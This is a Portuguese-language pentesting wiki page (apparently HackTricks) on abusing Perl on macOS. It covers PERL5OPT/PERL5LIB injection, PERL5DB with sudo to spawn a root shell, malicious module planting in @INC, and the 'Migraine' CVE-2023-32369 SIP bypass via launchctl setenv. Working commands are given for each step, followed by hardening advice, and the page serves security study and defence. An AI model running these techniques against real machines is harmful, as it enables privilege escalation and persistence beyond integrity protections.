# Injeção de Aplicações Perl no macOS

{{#include ../../../banners/hacktricks-training.md}}

## Através da variável de ambiente `PERL5OPT` & `PERL5LIB`

Usando a variável de ambiente **`PERL5OPT`**, é possível fazer com que **Perl** execute comandos arbitrários quando o interpretador inicia (mesmo **antes** da primeira linha do script alvo ser analisada).
Por exemplo, crie este script:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Agora **exporte a variável de ambiente** e execute o script **perl**:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Outra opção é criar um módulo Perl (por exemplo, `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
E então use as variáveis de ambiente para que o módulo seja localizado e carregado automaticamente:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Outras variáveis de ambiente interessantes

* **`PERL5DB`** – quando o interpretador é iniciado com a flag **`-d`** (debugger), o conteúdo de `PERL5DB` é executado como código Perl *dentro* do contexto do debugger. Se você puder influenciar tanto o ambiente **quanto** as flags da linha de comando de um processo Perl privilegiado, você pode fazer algo como:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # irá abrir um shell antes de executar o script
```

* **`PERL5SHELL`** – no Windows, essa variável controla qual executável de shell o Perl usará quando precisar criar um shell. É mencionada aqui apenas para completude, pois não é relevante no macOS.

Embora `PERL5DB` exija a opção `-d`, é comum encontrar scripts de manutenção ou instaladores que são executados como *root* com essa flag ativada para solução de problemas detalhada, tornando a variável um vetor de escalonamento válido.

## Via dependências (abuso de @INC)

É possível listar o caminho de inclusão que o Perl irá buscar (**`@INC`**) executando:
```bash
perl -e 'print join("\n", @INC)'
```
A saída típica no macOS 13/14 parece com:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Algumas das pastas retornadas nem existem, no entanto **`/Library/Perl/5.30`** existe, *não* é protegida pelo SIP e está *antes* das pastas protegidas pelo SIP. Portanto, se você puder escrever como *root*, pode colocar um módulo malicioso (por exemplo, `File/Basename.pm`) que será *preferencialmente* carregado por qualquer script privilegiado que importe esse módulo.

> [!WARNING]
> Você ainda precisa de **root** para escrever dentro de `/Library/Perl` e o macOS mostrará um prompt **TCC** pedindo *Acesso Completo ao Disco* para o processo que realiza a operação de escrita.

Por exemplo, se um script estiver importando **`use File::Basename;`**, seria possível criar `/Library/Perl/5.30/File/Basename.pm` contendo código controlado pelo atacante.

## Bypass do SIP via Assistente de Migração (CVE-2023-32369 “Migraine”)

Em maio de 2023, a Microsoft divulgou **CVE-2023-32369**, apelidado de **Migraine**, uma técnica de pós-exploração que permite a um atacante *root* **burlar completamente a Proteção de Integridade do Sistema (SIP)**. O componente vulnerável é **`systemmigrationd`**, um daemon intitulado com **`com.apple.rootless.install.heritable`**. Qualquer processo filho gerado por esse daemon herda a concessão e, portanto, é executado **fora** das restrições do SIP.

Entre os filhos identificados pelos pesquisadores está o interpretador assinado pela Apple:
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Porque o Perl respeita `PERL5OPT` (e o Bash respeita `BASH_ENV`), envenenar o *ambiente* do daemon é suficiente para obter execução arbitrária em um contexto sem SIP:
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Quando `migrateLocalKDC` é executado, `/usr/bin/perl` inicia com o malicioso `PERL5OPT` e executa `/private/tmp/migraine.sh` *antes que o SIP seja reabilitado*. A partir desse script, você pode, por exemplo, copiar um payload dentro de **`/System/Library/LaunchDaemons`** ou atribuir o atributo estendido `com.apple.rootless` para tornar um arquivo **indeletável**.

A Apple corrigiu o problema no macOS **Ventura 13.4**, **Monterey 12.6.6** e **Big Sur 11.7.7**, mas sistemas mais antigos ou não corrigidos permanecem exploráveis.

## Recomendações de hardening

1. **Limpar variáveis perigosas** – launchdaemons ou cron jobs privilegiados devem iniciar com um ambiente limpo (`launchctl unsetenv PERL5OPT`, `env -i`, etc.).
2. **Evitar executar interpretadores como root** a menos que estritamente necessário. Use binários compilados ou reduza privilégios cedo.
3. **Scripts de fornecedor com `-T` (modo de contaminação)** para que o Perl ignore `PERL5OPT` e outras opções inseguras quando a verificação de contaminação estiver habilitada.
4. **Mantenha o macOS atualizado** – “Migraine” está totalmente corrigido nas versões atuais.

## Referências

- Microsoft Security Blog – “Nova vulnerabilidade do macOS, Migraine, pode contornar a Proteção de Integridade do Sistema” (CVE-2023-32369), 30 de maio de 2023.
- Hackyboiz – “Pesquisa sobre Bypass do SIP do macOS (PERL5OPT & BASH_ENV)”, maio de 2025.

{{#include ../../../banners/hacktricks-training.md}}
